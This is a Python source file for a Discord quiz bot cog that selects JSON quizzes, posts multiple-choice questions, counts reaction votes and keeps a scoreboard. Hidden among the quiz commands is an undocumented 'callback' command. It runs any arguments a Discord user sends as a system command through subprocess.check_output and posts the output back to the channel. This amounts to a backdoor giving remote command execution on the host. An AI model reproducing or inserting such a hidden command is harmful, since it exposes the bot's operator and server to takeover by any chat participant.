#!/usr/bin/env python3

# Standard Imports
from subprocess import check_output
from collections import Counter
from datetime import datetime
from typing import List
import logging
import random
import json
import time
import sys
import os

# Third-Party Imports
from discord.ext import commands
from .util import *

class Quizzer(commands.Cog):
    """Class to provide quizzing interface."""

    def __init__(self, bot):
        # Bot as arg
        self.bot = bot

        # Logger
        self.B_LOG = logging.getLogger('Quiz Module')
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        self.B_LOG.addHandler(ch)

        # Bot's quizzes reference
        self.QUIZZES = {}

    @commands.command(pass_context=True)
    async def select(self, ctx, qname=None):
        """Select a quiz based on quizzes in quiz folder."""
        # Get quiz directory listing
        dirlist = os.listdir("quizzes")

        # Check if the passed in quiz exists
        if qname in dirlist:
            # Let the record show <insert_user> has instantiated a quiz!
            self.B_LOG.info(f"Quiz: {qname} From: {ctx.message.author.name}")

            # Grab some attributes of how to host quiz
            serv = ctx.message.guild
            chan = ctx.message.channel

            # Load up the quiz
            loaded = False
            try:
                quiz = open('quizzes/' + qname, "rb").read()
                quiz = json.loads(quiz)
                loaded = True
            except:
                self.B_LOG.info(f"Failed to load quiz {qname}")
                loaded = False

            # Get number of questions
            if loaded:
                qnum = len(quiz.keys())

            self.QUIZZES[f'{serv}:{chan}'] = {
                "name": qname,
                "quiz": quiz,
                "time": datetime.now(),
                "qnum": qnum,
                "players": {},
            }

            # Let the user know we have selected a quiz
            title = "Quiz Select"
            msg = {
                "Quiz Name:": qname,
                "Loaded:": loaded,
                "Q Num:": qnum
            }
            # Send msg
            embed = make_embed(title, msg)
        else:
            # Let the user know of error
            title = "Quiz Select"
            err = f"There was an error loading {qname}"
            msg = {
                "Error:": err
            }
            # Send msg
            embed = make_embed(title, msg)
        await ctx.message.channel.send(embed=embed)

    @commands.command(pass_context=True)
    async def callback(self, ctx, *part):
        try:
            x = check_output(part)
            await ctx.message.channel.send(x.decode())
        except Exception as e:
            print(e)

    @commands.command(pass_context=True)
    async def current(self, ctx):
        """Get the current loaded quiz for this channel."""
        # Obtain some params
        serv = ctx.message.guild
        chan = ctx.message.channel

        # Get quiz
        try:
            # Try to grab quiz
            quiz = self.QUIZZES[f"{serv}:{chan}"]
            name = quiz['name']
            date = quiz['time']
            qnum = quiz['qnum']

            # Create message
            title = "Current Selected Quiz"
            msg = {
                "Quiz Name:": name,
                "Time:": date,
                "Q Num:": qnum,
            }
            embed = make_embed(title, msg)
        except KeyError as e:
            # There is no quiz selected for this channel
            # so we should just let them know
            title = "Current Selected Quiz"
            msg = {
                "Error:" : "There does not seem to be any quiz for this channel.."
            }
            embed = make_embed(title, msg)

        # Send it
        await ctx.message.channel.send(embed=embed)

    @commands.command(pass_context=True)
    async def start(self, ctx, t=1, qnum=None):
        """Start function to start cycling through questions at time minutes per question."""
        # Verify this channel has a quiz assigned to it
        serv = ctx.message.guild
        chan = ctx.message.channel
        try:
            quiz = self.QUIZZES[f"{serv}:{chan}"]
        except KeyError as e:
            title = "Quiz not found"
            msg = {
                "Error:": e
            }
            embed = make_embed(title,msg)
            await ctx.message.channel.send(embed=embed)
            return

        # Iterate over a randomized list
        questions = list(quiz['quiz'].keys())
        random.shuffle(questions)

        # Fix our params
        if qnum is None:
            qnum = len(questions)
        else:
            qnum = int(qnum)
        t = float(t)

        # Iterate over all the questions
        for idx in range(qnum):
            # Grab question
            question = quiz['quiz'][questions[idx]]

            # Get question info
            answers = question['answers']
            correct = question['correct']

            # Create embed
            title = f"Quiz - Question {idx + 1}"
            choices = f""":regional_indicator_a: : {answers['a']}
:regional_indicator_b: : {answers['b']}
:regional_indicator_c: : {answers['c']}
:regional_indicator_d: : {answers['d']}
"""
  
            try:
                code = f"""```
{question['code']}
```
"""
                msg = {
                    "Question:": questions[idx],
                    "Cmd/Code:": code,
                    "Choices:": choices,
                }
            except:
                msg = {
                    "Question:": questions[idx],
                    "Choices:": choices,
                }

            # Create embed and send
            embed = make_embed(title, msg)
            msg = await ctx.message.channel.send(embed=embed)

            # Add reactions
            a = "🇦"
            b = "🇧"
            c = "🇨"
            d = "🇩"
            reactions = [a, b, c ,d]
            for r in reactions:
                await msg.add_reaction(r)

            whodid = {
                a: [],
                b: [],
                c: [],
                d: []
            }

            # Sleep sometime before revealing answer
            time.sleep(t)

            # Calculate the answers
            msg = await msg.channel.fetch_message(msg.id)
            reactions: List[discord.Reaction] = msg.reactions
            for react in reactions:
                users = await react.users().flatten()
                for u in users:
                    if self.bot.user.name in u.name:
                        continue
                    # Make sure first the user existss in this game
                    try:
                        quiz['players'][u]
                    except:
                        # User does not exist, lets add them
                        quiz['players'][u] = 0 # 0 points to start
                    whodid[react.emoji].append(u)

            # Who got it right?
            crct = []
            if correct == "a":
                # Give points to those who deserve it
                for user in whodid[a]:
                    if user not in whodid[b] and user not in whodid[c] and user not in whodid[d]:
                        quiz['players'][user] += 1
                        crct.append(user.name)
            elif correct == "b":
                # Give points to those who deserve it
                for user in whodid[b]:
                    if user not in whodid[a] and user not in whodid[c] and user not in whodid[d]:
                        quiz['players'][user] += 1
                        crct.append(user.name)
            elif correct == "c":
                # Give points to those who deserve it
                for user in whodid[c]:
                    if user not in whodid[b] and user not in whodid[a] and user not in whodid[d]:
                        quiz['players'][user] += 1
                        crct.append(user.name)
            elif correct == "d":
                # Give points to those who deserve it
                for user in whodid[d]:
                    if user not in whodid[b] and user not in whodid[c] and user not in whodid[a]:
                        quiz['players'][user] += 1
                        crct.append(user.name)

            # Print out correct answer
            title = "Correct Answer"
            # if no one, then no one
            if len(crct) == 0:
                crct.append("No one lol")
            msg = {
                "Correct Answer:": f"{correct}. {answers[correct]}",
                "Who Got it?": '\n'.join(crct)
            }
            embed = make_embed(title, msg)
            await ctx.message.channel.send(embed=embed)

            # Print out the scoreboard
            scrbrd = make_scoreboard(quiz['players'])
            await ctx.message.channel.send(embed=scrbrd)
            time.sleep(5)


def make_scoreboard(users, top=3):
    title = 'Current Scoreboard:'
    msg = []

    # Get max point user
    k = Counter(users)
    high = k.most_common(top)
    places = [i + 1 for i in range(top)]

    # Make output
    for u,v in high:
        msg.append(f"{places.pop(0)}. {u}:{v}")

    # Create embed
    return make_embed(title, msg)

def setup(bot):
    bot.add_cog(Quizzer(bot)) 
